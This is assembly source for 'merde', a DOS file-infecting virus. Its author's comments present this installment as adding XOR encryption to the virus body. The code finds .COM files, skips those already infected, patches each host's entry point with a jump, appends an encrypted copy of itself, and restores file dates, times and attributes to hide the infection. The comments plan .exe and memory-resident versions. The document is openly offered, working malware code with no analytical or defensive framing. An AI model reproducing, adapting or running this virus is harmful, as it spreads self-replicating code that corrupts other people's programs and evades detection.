;well, here's the next installment of the merde virus...all that is new;
;is your run of the mill xor encryption........and a little change in;
;the code itself to make it slightly more modular...;
;up+coming:	.exe version(why put 'em together? makes it too big);
;		an actual function besides infect!;
;		TSR infect version?;		
attrib			equ	21
time			equ	22
date			equ	24
fspec_address		equ	0e4h
filesize		equ	26
fname			equ	30
dta			equ	80h
virsize			equ	354
byte_compare_val	equ	35	
CODE_SEG	SEGMENT BYTE 
	ASSUME DS:CODE_SEG, CS:CODE_SEG
	ORG 100h
first:	jmp	caller
	db	128 dup(00)
caller:	call	caller2		;si=this address for the whole thing;

;ok, for encryption, we use the value of the byte at the jump instruction;
;if the file we find isn't infected...;

encryptv:	db	?

;si=offset of the "caller";

caller2:	pop	si	
	sub	si,3
	jmp	getstart

;jmp to getstart and have it call us back, getting the address of "start";
;into es..(I know, why not just add the size of the stuff to si?;
;I'll do it some other time; 

after:	pop	es		;es=start:;	

;okay, I decided, arbitrarily, to use bp and jump from the encrypt;
;function so it was more unsingular to a particular circumstance;
	
	mov	bp,es		;unencrypt de code+jump to virus;
	jmp	encrypt

;if we are being called from the write proc, we need to save BP on the stack;

encrypt_w:	mov	ax,bp	;ax=whereto jump at end;
		pop	bp	;bp=return to write routine;
		push	ax	;where to jump at end is on stack
;note the standard, run o' the mill encrypt/decrypt!;

encrypt:	push	bx		;might not be needed, I'll check later;
		push	si
		mov	cl,[si+3]	;offset of encrypt value;
		mov	bx,es		;where to start encrypting;
		xor	si,si
xloop:		mov	al,[bx+si]
		xor	al,cl
		mov	[bx+si],al
		cmp	si,0e7h		;size of post-start(or close enough);
		ja	done
		inc	si
		jmp	xloop
	done:	pop	si
		pop	bx
		jmp	bp		;jump whereever we were supposed to;

write_code:	call	encrypt_w	;yep, encrypt it;
		pop	bp		;get back address in this infected file;
		mov	bx,[di+9]	;file to jump to, and file handle;
		mov	ah,40h
		mov	cx,virsize	;total virus size
		mov	dx,si
		int	21h
		call	close_current
		jmp	nofiles		;not really, just didn't change name;
;this proc closes the file with original stats;
close_current:	
	mov	dx,[di+14]
	mov	cx,[di+12]
	mov	ax,5701h
	mov	bx,[di+9]
	int	21h
	mov	ah,3eh
	int	21h
	mov	ax,4301h
	xor	ch,ch
	mov	cl,[di+11]
	int	21h
	ret
nofiles:	push	ds
		pop	es
		jmp	bp

getstart:	call	after			


;encrypted from here on out-es=start of this procedure;
start:	mov	di,es
	add	di,fspec_address	;di=ADDRESS OF FILESPEC!; 
	mov	dh,[di+18]	
	mov	ah,[di+17]
	mov	al,[di+16]
	mov	bx,100h
	mov	[bx],al
	mov	[bx+1],ah
	mov	[bx+2],dh
	mov	bp,bx
	mov	ah,4eh		;------------------;
	mov	cx,33
	mov	dx,di		;find file match;
search:	int	21h
	jc	nofiles		;get out if none found;		
	mov	bx,dta+filesize	;compare filesize via BX;
	cmp	word ptr [bx],65000
	ja	leave1
	cmp	word ptr [bx],150
	jb	leave1
	jmp	ok
leave1:	mov	ah,4fh
	jmp	search
ok:	CLC

	;Okay-- DI=base of fspec;
	mov	bx,dta+attrib
	mov	al,[bx]
	mov	[di+11],al	;save attrib;
	mov	ax,word ptr [bx+1]
	mov	[di+12],ax	;save time;
	mov	ax,word ptr [bx+3]
	mov	[di+14],ax	;save date; 
	mov	ax,4301h
	mov	cx,0
	mov	dx,dta+fname
	int	21h		;set attrib to 0;
label2:	mov	ax,3d02h
	int	21h
	mov	[di+9],ax	;open + save handle;
	mov	bx,ax
	mov	ah,3fh
	mov	cx,3
	mov	dx,di
	add	dx,16		;dx points to save area for first three bytes;
	int	21h		;open handle, and read 3 bytes into it;
	cmp	byte ptr [di+16],0e9h
	jne	label1
cont:	mov	ax,4200h
	xor	cx,cx
	mov	dx,[di+17]
	add	dx,3+byte_compare_val
	mov	bx,[di+9]
	int	21h
	mov	ah,3fh
	mov	cx,2
	mov	dx,di
	add	dx,6
	int	21h
	mov	dx,[di+6]
	cmp	dx,[si+byte_compare_val]
	jne	label1
	call	close_current
	jmp	leave1
label1:	
	;set encrypt value here---(low order byte of filesize of next file;
	mov	bx,dta+filesize
	mov	dl,[bx]
	mov	[si+3],dl
	mov	bx,[di+9]
	mov	ax,4200h
	xor	cx,cx
	mov	dx,0
	int	21h
;okay, this is kinda thick..;
;set pointer to after jmp instruct, and change address to size;
;of file plus 3 for jmp instruction, minding that we have to flip stuff;
	mov	bx,dta+filesize
	mov	dh,[bx+1]	;high val equals 2nd part of word+vice versa;
	mov	dl,[bx]
	sub	dx,3
	mov	[di+7],dx
	mov	byte ptr [di+6],0e9h	
	mov	ah,40h
	mov	bx,[di+9]
	mov	dx,di
	add	dx,6
	mov	cx,3
	int	21h
	xor	cx,cx
	mov	ax,4202h
	xor	dx,dx
	int	21h
	jmp	write_code

fspec:	db	'*.com',0	;bx+0;
disk_buffer:	db	3 DUP(?)	;di+6;
handle:		dw	?		;di+9;
attribute:	db	?		;di+11;
otime:		dw	?		;di+12;
odate:		dw	?		;di+14;
first_3:	db	0cdh,20h,00	;di+16;
CODE_SEG	ENDS
END	first